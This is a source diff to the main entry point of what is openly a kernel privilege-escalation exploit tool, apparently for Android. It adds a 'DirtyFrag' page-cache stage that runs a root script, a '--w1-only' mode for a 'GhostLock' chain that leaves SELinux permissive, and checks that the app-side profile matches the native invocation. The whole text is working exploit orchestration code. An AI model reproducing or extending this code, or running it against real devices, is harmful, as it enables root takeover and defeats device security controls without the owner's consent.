@@ -15,9 +15,11 @@
 #include "attack/ops.hpp"
 #include "kernelsnitch/stride_verify.h"
 #include "profile/entry.h"
+#include "profile/pipeline_check.h"
 #include "support/fatal_error.hpp"
 #include "support/run_state.hpp"
 #include "route/orchestrator.hpp"
+#include "session/dirtyfrag_stage.hpp"
 
 #include <array>
 #include <cstdio>
@@ -48,6 +50,9 @@ int main(int argc, char **argv) {
         bool force_attack = false;
         bool status_record = false;
         bool probe_stride = false;
+        bool w1_only = false;
+        const char *dirtyfrag_plan = nullptr;
+        const char *dirtyfrag_mode = "full";
         const char *prebuilt_path = nullptr;
         const char *dump_dir = nullptr;
         for (int32_t i = 1; i < argc; i++) {
@@ -59,6 +64,12 @@ int main(int argc, char **argv) {
                 status_record = true;
             } else if (std::string_view(argv[i]) == "--probe-stride") {
                 probe_stride = true;
+            } else if (std::string_view(argv[i]) == "--w1-only") {
+                w1_only = true;
+            } else if (std::string_view(argv[i]) == "--dirtyfrag" && i + 1 < argc) {
+                dirtyfrag_plan = argv[++i];
+            } else if (std::string_view(argv[i]) == "--dirtyfrag-mode" && i + 1 < argc) {
+                dirtyfrag_mode = argv[++i];
             } else if (std::string_view(argv[i]) == "--load-prebuilt-profile" &&i + 1 < argc) {
                 prebuilt_path = argv[++i];
             } else if (std::string_view(argv[i]) == "--dump-kernel-log" && i + 1 < argc) {
@@ -66,7 +77,7 @@ int main(int argc, char **argv) {
             } else {
                 pr_error("usage: %s [--ghostlock-app-call | --load-prebuilt-profile <bin>]"
                 " [--dump-kernel-log <dir>] [--force-attack] [--enable-status-record]"
-                " [--probe-stride]\n", argv[0]);
+                " [--probe-stride] [--w1-only] [--dirtyfrag <plan> [--dirtyfrag-mode full|noshell|noscript]]\n", argv[0]);
                 return 1;
             }
         }
@@ -79,6 +90,19 @@ int main(int argc, char **argv) {
             return 1;
         }
         support::run_state::configure(status_record);
+        /* Second way, native half: the app has already applied W1 and written
+         * the control file; run the page-cache stage and the root script. No
+         * profile is loaded — this mode never touches the futex route. */
+        if (dirtyfrag_plan != nullptr) {
+            if (config::runtime_config_snapshot().init() != 0) {
+                pr_error("runtime configuration failed errno=%d\n", errno);
+                throw FatalError{};
+            }
+            return session::run_dirtyfrag_stage(dirtyfrag_plan, dirtyfrag_mode);
+        }
+        /* Second way: the backend stops after W1 and the frontend handoff is
+         * skipped; the app runs the DirtyFrag page-cache stage afterwards. */
+        session::g_exploit_session.w1_only = w1_only;
 
         int32_t loaded;
         if (prebuilt_path != nullptr) {
@@ -113,6 +137,35 @@ int main(int argc, char **argv) {
                     static_cast<unsigned long long>(digests.computed));
         } else {
             pr_info("profile digest: absent (app build predates it)\n");
+        }
+
+        /* The app resolved the profile's ordered pipeline list to one entry and
+         * wrote it into the wire; the invocation must match. A mismatch means
+         * the two sides disagree about the run's shape: a resolved DirtyFrag run
+         * started as the full chain would run the wrong stage, and a GhostLock
+         * run stopped after W1 would leave SELinux permissive with no stage to
+         * continue. Absent (a document that predates the cross-check) keeps the
+         * legacy behaviour. */
+        switch (profile::check_pipeline(decoded.meta.pipeline, w1_only)) {
+            case profile::PipelineCheck::NotDeclared:
+                break;
+            case profile::PipelineCheck::Unknown:
+                pr_error("profile pipeline=%u is unknown; refusing to run\n",
+                         static_cast<unsigned>(decoded.meta.pipeline.value_or(0)));
+                throw FatalError{};
+            case profile::PipelineCheck::Mismatch:
+                pr_error("pipeline mismatch: profile resolved %s, native invoked %s\n",
+                         decoded.meta.pipeline == profile::kPipelineDirtyfrag
+                             ? "dirtyfrag"
+                             : "ghostlock",
+                         w1_only ? "with --w1-only" : "as the full chain");
+                throw FatalError{};
+            case profile::PipelineCheck::Match:
+                pr_info("pipeline=%s verified against the invocation\n",
+                        decoded.meta.pipeline == profile::kPipelineDirtyfrag
+                            ? "dirtyfrag"
+                            : "ghostlock");
+                break;
         }
 
         auto &session = session::g_exploit_session;
